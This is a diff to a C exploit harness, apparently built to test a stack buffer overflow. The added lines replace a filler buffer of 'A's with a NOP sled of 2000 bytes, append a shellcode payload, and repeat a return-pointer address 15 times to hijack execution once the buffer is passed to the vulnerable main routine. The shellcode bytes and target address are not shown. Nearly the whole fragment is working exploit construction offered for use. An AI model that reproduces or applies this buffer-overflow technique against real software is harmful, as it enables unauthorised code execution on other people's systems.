@@ -74,14 +74,35 @@ int main(int argc, char *argv[]) {
 
     //Construction of the tainted buffer has been omitted
 
-	int j=0;
+	int j=0; int i=0;
 
-	strcpy(taintedbuf, "BBBB");
+	strcpy(taintedbuf, "\x90");
 
-	for(j=0;j<2068;j++)
+	for(j=0;j<1999;j++)
 	{
-		strcat(taintedbuf, "A");
+		strcat(taintedbuf, "\x90");
 	}
+
+	strcat(taintedbuf, shellcode);
+
+	taintedbufWritePtr = strlen(taintedbuf);
+
+	for(i=0; i<15; i++)
+	{
+	intUnion.integer=(retfptraddr);
+	taintedbuf[taintedbufWritePtr+3]=intUnion.byte[3];
+	taintedbuf[taintedbufWritePtr+2]=intUnion.byte[2];
+	taintedbuf[taintedbufWritePtr+1]=intUnion.byte[1];
+	taintedbuf[taintedbufWritePtr]=intUnion.byte[0];
+	taintedbufWritePtr+=4;
+	}
+/*
+	for(j=0;j<500;j++)
+		{
+			strcat(taintedbuf, "\x90");
+		}
+*/
+
 
     printf("\nThe length of tainted buffer is: %d\n", strlen(taintedbuf));
     argc=2;//real_main's argc should only be 2
